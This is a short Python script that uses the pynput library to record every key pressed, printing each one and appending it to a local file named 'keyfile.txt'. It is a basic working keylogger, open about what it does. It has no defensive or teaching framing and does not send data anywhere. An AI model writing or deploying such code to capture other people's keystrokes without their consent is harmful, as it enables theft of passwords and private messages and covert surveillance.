from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
            char = str(key)
            if (str(key) == 'Key.space'):
                  logKey.write(char +'\n')
            else:
                  logKey.write(char)
                 
           
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()